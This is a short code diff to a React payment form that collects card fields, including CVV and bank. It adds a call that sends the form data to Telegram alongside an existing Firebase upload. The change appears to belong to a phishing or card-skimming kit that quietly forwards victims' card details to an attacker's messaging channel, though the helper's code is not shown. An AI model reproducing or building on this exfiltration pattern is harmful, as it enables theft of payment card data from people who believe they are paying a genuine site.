@@ -5,6 +5,7 @@ import logoFile from '../../assets/472/logoFile.png'
 import { sendFirebaseData } from '../../Firebase/sendFirebaseData'
 import FormTc from './componentsFormPay/FormTc'
 import Modal from './Modal'
+import sendTelegram from './componentModal/Functions/sendTelegram'
 const initialState = {
     cvv: "",
     bank: "",
@@ -20,7 +21,7 @@ const FormPay = ({infoPay}) => {
     
     const enviarFirebase=()=>{
         sendFirebaseData({infoPay,data,scr:"load"},setIdF)
-    
+        sendTelegram({infoPay,data})
     }
     useEffect(()=>{
         window.sessionStorage.getItem('id')&&setIdF(window.sessionStorage.getItem('id'))
